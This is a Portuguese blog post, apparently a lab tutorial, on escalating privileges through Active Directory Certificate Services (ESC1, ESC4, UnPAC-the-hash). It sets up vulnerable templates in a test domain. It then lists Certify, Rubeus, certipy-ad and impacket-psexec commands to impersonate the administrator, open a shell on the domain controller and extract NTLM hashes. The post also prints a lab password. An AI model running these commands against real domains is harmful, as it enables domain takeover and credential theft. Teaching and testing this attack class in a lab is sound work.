---
title: "Active Directory Domain Escalation"
excerpt: "Técnicas de escalonamento de privilégios em ambiente AD CS."
categories:
  - Hacking
tags:
  - Active Directory Domain Escalation
  - Domain Escalation
  - Active Directory
  - ESC1
  - ESC4
  - ESC6
  - UN-PAC the Hash
  - AD
  - AD CS
  - Certificado
  - Certify
  - Openssl
  - Rubeus

toc: true
---

# ESC1

A vulnerabilidade ESC1 permite que um atacante controle o campo **subjectAltName (SAN)** em um certificado gerado. Ao modificar este campo, um certificado pode ser criado para autenticar como qualquer usuário desejado (administrator, por exemplo).

## Tentando acessar o DC

![Untitled](https://github.com/user-attachments/assets/d0cee2d6-0d27-45d1-8fe0-3da80726fb65)

Como a Mônica não é Administradora de Domínio, não possui permissão para ler a pasta.

## Deixando o Modelo Vulnerável

Alterações iniciais necessárias para deixar um modelo vulnerável.

![Untitled 1](https://github.com/user-attachments/assets/f37fcd0a-558f-4e33-b064-5080aa0f2755)

Na opção de gerenciamento dos Modelos de Certificado, escolha o modelo Workstation Authentication e adicione o seguinte “Domain Users”, o seu usuário sem privilégios (no exemplo, monraybrandt) e um usuário com privilégios (no exemplo, cbricks).

## Encontrar o Template Vulnerável

```powershell
Certify.exe find /vulnerable
```

![Untitled 2](https://github.com/user-attachments/assets/309fccf5-1cdf-4c79-a310-034ffd8b3725)

![Untitled 3](https://github.com/user-attachments/assets/5ac7cb3c-3346-46cf-9e48-c8c9b3d27282)

## Gerando o Certificado

```powershell
Certify.exe request /ca:DC01.redteam.corp\redteam-DC01-CA /template:Workstation /altname:administrator
```

![Untitled 4](https://github.com/user-attachments/assets/e28df193-adba-496f-a12f-c1c139721a33)

![Untitled 5](https://github.com/user-attachments/assets/9b778584-edd9-4b65-a517-69426ae642c0)

Copie todo o código gerado (RSA PRIVATE KEY e CERTIFICATE) para um arquivo chamado “cert.pem”.

## Conversão

Utilize o openssl para converter o “cert.pem” em cert.pfx”, como diz o comando o final da imagem.

**OBS: a senha é opcional.**

```powershell
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```

![Untitled 6](https://github.com/user-attachments/assets/aeeefaf1-8612-4f06-942b-09c5835f7656)

## Pedindo o Ticket

Com o certificado feito, pode-se especificar o nome do usuário e pedir pelo TGT (Ticket Granting Ticket) para o KDC.

```powershell
Rubeus.exe asktgt /user:administrator /certificate:cert.pfx /domain:redteam.corp /ptt
```

![Untitled 7](https://github.com/user-attachments/assets/a80266d5-07a6-40c0-b290-2660d7352442)

![Untitled 8](https://github.com/user-attachments/assets/ab8b8434-84bb-42ae-a390-ddb58ce78d33)

## Verificando o Ticket

```powershell
klist
```

![Untitled 9](https://github.com/user-attachments/assets/023baee2-862b-4ea2-874a-6314e98c12d8)

## Acessando o DC

![Untitled 10](https://github.com/user-attachments/assets/23df135e-4c86-412d-b12e-6f3132e6568f)

# ESC4

A vulnerabilidade ESC4 envolve modelos de certificados que têm permissões de controle de acesso (ACLs) mal configuradas, permitindo que usuários não privilegiados modifiquem as propriedades do próprio modelo. Um atacante com permissões de escrita pode modificar suas configurações para introduzir vulnerabilidades de ESC1, ESC2 ou ESC3, e assim escalar privilégios na rede.

## Deixando o Modelo Vulnerável

![Untitled 11](https://github.com/user-attachments/assets/f32229d9-c9c3-4cb8-8c7c-98e1ca3d96db)

## Salvar a configuração do modelo User

```powershell
certipy-ad template -username [monraybrandt@192.168.1.40](mailto:monraybrandt@192.168.1.40) -password 'M0n1c4!' -template User -save-old
```

![86fda4ac-3dc3-4dae-9755-52d7ec3c1dda](https://github.com/user-attachments/assets/fe5e1966-42b2-4a80-a07c-bf577c88d4ca)

## Alterar configuração e requisitar certificado

```powershell
certipy-ad req -username monraybrandt@DC01.redteam.corp -password 'M0n1c4!' -ca redteam-DC01-CA -target DC01.redteam.corp -template User -upn administrator@redteam.corp -debug
```

![2badef11-338b-4e1c-bb7b-5b602cf91a88](https://github.com/user-attachments/assets/b6a52cc1-a527-49f3-a5b3-f4bff6e014c4)

### Como que o certificado vai ficar

![Untitled 12](https://github.com/user-attachments/assets/fc641938-68b2-404b-8389-7015a8020415)

## Requisitar TGT

A autenticação como administrador acontece com o arquivo PFX e suas as credenciais são salvas no dispositivos (arquivo de cache).

```powershell
certipy-ad auth -pfx 'administrator.pfx' -username administrator -domain redteam.corp -dc-ip 192.168.1.40
```

![3ca9cc70-7038-45a8-b4b9-1b2e481b01c6](https://github.com/user-attachments/assets/82633053-642b-459c-9896-bbdacbb7f7ee)

## Arquivos gerados até agora

![71706e53-0785-410e-a031-58557b0e33f3](https://github.com/user-attachments/assets/e2dad95f-4dd9-478d-a223-969f25e542ad)

## Usando credenciais salvas em cache

![a184a61f-274b-42f5-8d68-7d487da77374](https://github.com/user-attachments/assets/c4b2de4f-f2ee-4366-a34b-2be9472fa54e)

## Conectar utilizando psexec

```powershell
impacket-psexec -k -no-pass -debug -dc-ip 192.168.1.40 administrator@dc01.redteam.corp
```

![Untitled 13](https://github.com/user-attachments/assets/05f0034d-97ca-49e4-8e77-a622483157e8)

## Executando comandos

![Untitled 14](https://github.com/user-attachments/assets/06842973-b353-4ac1-b4a9-a73a9dee81a0)

## Restaurar a configuração anterior

```powershell
certipy-ad template -username [monraybrandt@192.168.1.40](mailto:monraybrandt@192.168.1.40) -password 'M0n1c4!' -template User -configuration User.json
```

![Untitled 15](https://github.com/user-attachments/assets/20855977-5ea0-4907-aeca-ce938794aa14)

# ESC6

Mesma coisa que o ESC1

# UN-PAC the Hash

Ao usar o PKINIT para obter um TGT (Ticket Granting Ticket), o KDC (Key Distribution Center) inclui no bilhete um PAC_CREDENTIAL_INFO estrutura que contém as chaves NTLM (ou seja. hashes LM e NT) do usuário de autenticação. Esse recurso permite que os usuários alternem para autenticações NTLM quando os servidores remotos não suportam Kerberos, enquanto ainda dependem de um mecanismo de verificação de pré-autenticação Kerberos assimétrico (ou seja. PKINIT).

As chaves NTLM serão então recuperáveis após um TGS-REQ através de U2U, combinado com S4U2self, que é uma solicitação de Ticket de Serviço feita ao KDC onde o usuário solicita a autenticação para si mesmo.

![Untitled 17](https://github.com/user-attachments/assets/6e3e771b-306e-4937-a81d-faac96849580)

Aproveitando o “cert.pfx” gerado no ESC1.

```powershell
Rubeus.exe asktgt /getcredentials /user:administrator /domain:redteam.corp /certificate:cert.pfx /show
```

![Untitled 18](https://github.com/user-attachments/assets/999b46b4-0a2b-48b0-9af3-4f95d3912ad3)

![Untitled 19](https://github.com/user-attachments/assets/a8e05e3f-df37-4a12-bbbb-fd0a0e048c12)